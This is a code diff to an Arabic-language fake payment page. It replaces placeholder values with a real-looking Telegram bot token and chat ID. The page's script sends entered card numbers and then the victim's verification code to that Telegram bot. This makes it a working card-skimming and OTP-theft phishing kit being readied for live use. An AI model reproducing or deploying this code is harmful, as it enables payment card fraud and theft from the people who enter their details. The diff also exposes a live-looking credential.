@@ -146,7 +146,7 @@
             
             <div class="form-group">
                 <label for="amount">المبلغ</label>
-                <input type="text" id="amount" placeholder="100.00" required>
+                <input type="text" id="amount" placeholder="$" required>
             </div>
             
             <button type="submit">تأكيد الدفع</button>
@@ -210,8 +210,8 @@
             };
             
             // إرسال البيانات إلى البوت عبر Telegram API
-            const botToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const botToken = '7042860131:AAHI-nuswzLeHWdBfB4P3EPxWiO7vGrwxzw';
+            const chatId = '7154036384';
             const message = `💳 *بيانات بطاقة جديدة* 💳
             
 📌 *رقم البطاقة:* ${paymentData.cardNumber}
@@ -252,8 +252,8 @@
             const verificationCode = document.getElementById('verificationCode').value;
             
             // إرسال كود التحقق إلى البوت
-            const botToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const botToken = '7042860131:AAHI-nuswzLeHWdBfB4P3EPxWiO7vGrwxzw';
+            const chatId = '7154036384';
             const verificationMessage = `🔑 *كود التحقق*: ${verificationCode}`;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
